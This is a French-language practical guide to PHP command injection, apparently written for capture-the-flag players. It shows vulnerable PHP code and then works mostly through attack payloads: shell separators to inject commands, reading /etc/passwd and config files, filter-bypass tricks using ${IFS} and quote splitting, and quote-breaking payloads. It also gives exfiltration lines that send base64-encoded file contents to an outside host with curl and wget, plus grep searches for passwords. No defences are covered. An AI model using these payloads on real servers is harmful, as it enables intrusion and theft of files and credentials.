# Injection de commande en PHP - Guide pratique

## C'est quoi concrètement ?

L'injection de commande, c'est quand tu arrives à faire exécuter tes propres commandes Linux sur un serveur en passant par une application PHP vulnérable.

## Les fonctions PHP dangereuses

Ces fonctions exécutent des commandes shell :

```php
system("ls");           // Affiche directement
exec("ls", $output);    // Stocke dans un tableau
shell_exec("ls");       // Retourne une string
passthru("ls");         // Affiche directement (binaire)
`ls`;                   // Backticks = shell_exec
```

## Code vulnérable typique

```php
// Exemple 1 : Ping
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);

// Exemple 2 : Lookup DNS
$domain = $_POST['domain'];
exec("nslookup " . $domain);

// Exemple 3 : Traitement fichier
$file = $_GET['file'];
shell_exec("cat /uploads/" . $file);
```

Le problème : **l'entrée utilisateur n'est pas filtrée**.

## Les séparateurs magiques

Sur Linux, tu peux chaîner des commandes :

| Séparateur | Effet | Exemple |
|------------|-------|---------|
| `;` | Exécute les deux commandes | `cmd1 ; cmd2` |
| `&&` | cmd2 si cmd1 réussit | `cmd1 && cmd2` |
| `\|\|` | cmd2 si cmd1 échoue | `cmd1 \|\| cmd2` |
| `\|` | Pipe : sortie de cmd1 → cmd2 | `cmd1 \| cmd2` |
| `&` | cmd1 en arrière-plan | `cmd1 & cmd2` |
| `` `cmd` `` | Exécute cmd et retourne le résultat | `` echo `whoami` `` |
| `$(cmd)` | Pareil que backticks | `echo $(whoami)` |

## Exploitation étape par étape

### Étape 1 : Identifier l'injection

Tu as un formulaire ou un paramètre GET/POST. Teste avec :

```
; ls
& ls
| ls
&& ls
|| ls
` ls `
$(ls)
```

Si tu vois un résultat différent → vulnérable !

### Étape 2 : Lister les fichiers

```bash
; ls
; ls -la          # Avec fichiers cachés
; ls /            # Racine
; pwd             # Où suis-je ?
; ls ../          # Dossier parent
```

### Étape 3 : Lire des fichiers

```bash
; cat fichier.txt
; head fichier.txt
; tail fichier.txt
; more fichier.txt
; less fichier.txt
; cat .fichier_cache    # Fichiers avec point devant
```

### Étape 4 : Récupérer des infos système

```bash
; whoami          # Quel utilisateur ?
; id              # Groupes et privilèges
; uname -a        # Info système
; cat /etc/passwd # Liste utilisateurs
```

## Contourner les filtres

### Le code filtre certains caractères ?

```bash
# Si "cat" est bloqué
; c''at fichier
; c""at fichier
; ca\t fichier
; /bin/cat fichier

# Si espace est bloqué
; cat${IFS}fichier
; cat$IFS$9fichier
; {cat,fichier}

# Si "/" est bloqué
; cat .passwd        # Fichier local
; cat ..passwd       # Remonte d'un niveau
```

### Utiliser l'encodage

```bash
# Base64
; cat fichier | base64
# Puis décode sur ta machine

# Hexdump
; xxd fichier
; od -A x -t x1z fichier
```

## Cas pratiques selon le contexte

### Application de ping

```php
// Code vulnérable
system("ping -c 3 " . $_POST['ip']);
```

**Exploitation :**
```
127.0.0.1; cat /etc/passwd
127.0.0.1' && cat flag.txt && echo '
```

### Application de recherche DNS

```php
// Code vulnérable
exec("nslookup " . $_GET['domain']);
```

**Exploitation :**
```
google.com; ls -la
google.com | cat index.php
```

### Application de traitement d'image

```php
// Code vulnérable  
shell_exec("convert uploads/" . $_POST['file'] . " output.jpg");
```

**Exploitation :**
```
test.jpg; cat config.php
test.jpg && whoami
```

## Gestion des quotes

Si le code utilise des quotes, tu dois les fermer :

```php
// Code : system("ping -c 3 '" . $input . "'");
```

**Payloads :**
```
'; cat fichier; echo '
' && cat fichier && echo '
' || cat fichier || '
'`cat fichier`'
```

```php
// Code : system('ping -c 3 "' . $input . '"');
```

**Payloads :**
```
"; cat fichier; echo "
" && cat fichier && echo "
"`cat fichier`"
```

## Exfiltration de données

### Méthode 1 : Affichage direct
```bash
; cat fichier
```

### Méthode 2 : Copier vers un fichier accessible
```bash
; cp secret.txt public/data.txt
# Puis accède via http://site.com/public/data.txt
```

### Méthode 3 : Encoder pour éviter interprétation
```bash
; cat fichier.php | base64
; xxd -p fichier.php
```

### Méthode 4 : DNS/HTTP exfiltration
```bash
; curl http://ton-serveur.com/?data=$(cat fichier | base64)
; wget http://ton-serveur.com/$(cat fichier)
```

## Debugging : Pourquoi ça marche pas ?

### Pas de sortie visible ?

- Regarde le **code source HTML** (Ctrl+U)
- Le PHP peut être caché dans le HTML
- Essaie de rediriger : `; ls > /tmp/output.txt`

### Erreur ou timeout ?

- La commande est trop longue
- Utilise `timeout` : `; timeout 2 cat fichier`
- Simplifie : `; head -n 20 fichier`

### Caractères bizarres ?

- Le serveur encode la sortie
- Utilise base64 : `; cat fichier | base64`

## Checklist d'exploitation

1. ✅ Tester les séparateurs de base : `; && | ||`
2. ✅ Lister les fichiers : `ls -la`
3. ✅ Identifier les fichiers intéressants
4. ✅ Tester la lecture : `cat`, `head`, `tail`
5. ✅ Si filtré, contourner avec encodage ou alternatives
6. ✅ Vérifier le code source HTML si rien ne s'affiche
7. ✅ Exfiltrer les données par la méthode qui marche

## Commandes utiles récap

```bash
# Reconnaissance
; ls -la
; pwd
; whoami
; find . -name "*.txt"
; find . -name ".*"           # Fichiers cachés

# Lecture de fichiers
; cat fichier
; cat .fichier_cache
; head -n 50 fichier
; strings fichier
; file fichier

# Recherche
; grep -r "password" .
; grep -r "flag" .
; find . -type f -name "*flag*"

# Copie/Manipulation
; cp secret.txt public/s.txt
; echo "test" > /tmp/test.txt
```

## Résumé en 3 étapes

1. **Trouve le point d'injection** → teste les séparateurs
2. **Liste et explore** → `ls`, `cat`, `find`
3. **Récupère ce que tu cherches** → lecture, copie, exfiltration
